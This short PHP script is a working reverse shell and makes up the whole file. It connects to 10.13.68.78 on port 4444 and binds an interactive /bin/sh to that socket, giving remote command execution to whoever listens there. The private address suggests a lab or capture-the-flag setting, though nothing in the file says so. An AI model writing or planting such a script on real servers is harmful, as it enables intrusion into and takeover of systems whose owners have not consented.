<?php
$ip ='10.13.68.78'; 
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(
  0 => $sock,
  1 => $sock,
  2 => $sock
), $pipes);
?>

